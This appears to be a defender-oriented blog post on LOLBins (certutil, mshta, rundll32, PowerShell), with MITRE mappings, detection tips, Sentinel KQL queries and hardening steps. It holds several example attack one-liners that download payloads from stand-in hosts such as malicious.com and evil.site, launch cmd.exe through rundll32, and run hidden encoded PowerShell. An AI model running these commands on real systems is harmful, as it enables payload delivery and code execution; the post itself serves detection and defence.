---
title: "Living off the Land Binaries (LOLBins): A Deep Dive into Fileless Attack Techniques
Introduction"
datePublished: Tue Jul 15 2025 10:58:22 GMT+0000 (Coordinated Universal Time)
cuid: cmd4f5na8000p02jpfboabr4o
slug: living-off-the-land-binaries-lolbins-a-deep-dive-into-fileless-attack-techniques-introduction
canonical: https://medium.com/@ravisharma.rs939/living-off-the-land-binaries-lolbins-a-deep-dive-into-fileless-attack-techniques-7ce1e3289bcb
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1752576926238/ff34d060-c556-4f68-b1df-31d17bcab6e7.png

---

#### **Introduction**

Modern adversaries don't always rely on custom malware to breach a network. Instead, they often use what's already available on the target system. This tactic is called Living off the Land (LotL), and the tools they use are legitimate binaries already present in the OS are known as LOLBins.

 In this Depp-Dive blog, we’ll explore :

* *What LOLBins are and why they matter*
    
* *How attackers use them in real-world campaigns*
    
* *Technical examples of abuse*
    
* *detection techniques and SIEM queries*
    
* *MITRE ATT&CK mappings*
    
* *Hardening strategies for defenders*
    

#### What Are LOLBins?

LOLBins (Living off the Land Binaries) are legitimate executables or scripts, often part of Windows or installed software, that attackers can abuse to perform malicious actions without dropping traditional malware.

They’re used in fileless attacks, where no new binaries are written to disk, making them extremely difficult to detect using signature-based tools like antivirus or EDR.

#### Why Use LOLBins?

* Trust by the system — Not flagged by security tools due to their legitimacy 
    
* Blends into normal activity — Execution looks like Normal admin tasks
    
* No binary dropped to disk — Leaves fewer artifacts, making forensic investigation harder 
    
* Available across systems — Most binaries exist across all Windows environments
    

#### Real-World Examples of LOLBin Usage

**Case: FIN7 Abuse of** mshta.exe

FIN7, a well-known financially motivated group, has been observed using mshta.exe to download and execute remote malicious HTA payloads that launch PowerShell scripts to establish persistence and C2 communication.

This technique bypasses application whitelisting and avoids dropping new binaries.

#### Commonly Abused LOLBins and Deep Technical Examples

Certuil.exe

* Purpose: Certificate utility 
    
* Location: c:\\windows\\system32\\certutil.exe
    
* MITRE Tactic: T1105 — Ingress Tool Transfer 
    

**Abused For:** 

* Downloading Payloads
    
* Encoding/Decoding files
    

**Examples:** certutil.exe -urlcache -split -f [http://malicious.com/payload.exe](http://malicious.com/payload.exe) payload.exe

**Detection:** 

* Monitor network connections initiated by certutil
    
* Look for certutil writing .exe, .ps1, or .bat files
    
* Flag: When it appears outside certificate-related use cases
    

**mshta.exe**

* Purpose: Executes HTML Applications(.hta)
    
* MITRE Technique: T1218.005 — Signed Binary Proxy Execution: Mshta
    

**Abuse for:** 

* Executing remote JavaScript/VBScript
    
* Bypassing Application Whitelisting
    

**Example:** mshta.exe “[http://evil.site/malicious.hta](http://evil.site/malicious.hta)"

**Detection:** 

* Alert on mshta reaching out to external URLs 
    
* Rarely used in Modern environments, any execution may be suspicious 
    
* Correlate parent processes (e.g., spawned by Word or Excel)
    

**rundll32.exe**

* Purpose: Runs functions exported from DLLs
    
* MITRE Technique: T1218.011 — Rundll32
    

**Abuse for:**

* Code execution via DLL side-loading or COM objects
    
* Running shellcode or scripts through DLL proxying
    

**Example:** 

rundll32.exe javascript:”..\\mshtml,RunHTMLApplication”;eval(“new ActiveXObject(‘WScript.Shell’).Run(‘cmd.exe’)”)

**Detection:**

* Flag rundll32 spawning Powershell or CMD
    
* Look for DLLs loaded from user directories, temp folders
    

**Powershell.exe/pwsh.exe:**

* Purpose: Command line shell and scripting language
    
* MITRE Technique: T1059.001 — PowerShell, T1086 — Obfuscated Files or Information
    

**Abuse for:** 

* Downloading and executing payloads
    
* In-memory execution (fileless Malware)
    
* Obfuscated command execution
    

**Example:** powershell.exe -nop -w hidden -enc &lt;base64\_string&gt;

**Detection:** 

* PowerShell running encoded (-enc) or obfuscated commands
    
* Logs: Event ID 4104 (Script Block Logging), 4688 (Process Creation)
    

#### Behavioural Hunting Tips

* WINWORD.EXE spawning Powershell.exe
    
* Explorer.exe spawning Certutil.exe
    
* LOLBins spawned by Office macros or scripts
    

#### Time-of-Day Analysis

* LOLBins executed during non-business hours
    
* Executions outside patch/update cycles
    

#### Execution Context 

* Monitor LOLBins being executed from: 
    

1- Temp folders

2- User profile directories

3- Non-admin processes

#### Sample SIEM Queries

Here are sample detection rules for **Microsoft Sentinel / Kusto Query Language (KQL)**:

1. **Detect certutil.exe downloading files:**
    

DeviceProcessEvents  
| where FileName == “certutil.exe”  
| where ProcessCommandLine contains “http”

**2\. Detect mshta.exe from unknown sources:**

DeviceProcessEvents  
| where FileName == “mshta.exe”  
| where ProcessCommandLine contains “http” or ProcessCommandLine contains “script”

**3\. Detect encoded PowerShell:**

DeviceProcessEvents  
| where FileName in (“powershell.exe”, “pwsh.exe”)  
| where ProcessCommandLine contains “-enc” or ProcessCommandLine contains “FromBase64String”

#### Hardening Against LOLBins

1. Use Application Control
    

* AppLocker or Windows Defender Application Control (WDAC) to block unused system binaries 
    

2\. PowerShell Constrained Mode

* Force PowerShell into Constrained Language Mode for non-admin users
    

3\. Disable Unused LOLBins

* Rename or restrict access to tools like mshta.exe, certutil.exe, wmic.exe if not needed
    

4\. Enable Logging

* Sysmon, PowerShell logging (Module & ScriptBlock), Audit Process Creation (Event ID 4688)
    

5\. Build Threat Hunt Use Cases

* Regularly run playbooks to search for LOLBin abuse patterns
    

#### Final Thoughts

**LOLBins are not vulnerabilities, they’re features.** But when abused by attackers, they become stealthy, powerful weapons that are hard to detect.

As defenders and threat hunters, our goal should be to:

* Know which LOLBins exist in our environment
    
* Monitor their behaviour
    
* Build baselines and alert on anomalies
    
* Educate teams about their risk
    

Fileless threats aren’t coming — they’re already here. Understanding LOLBins is your first step toward better defence.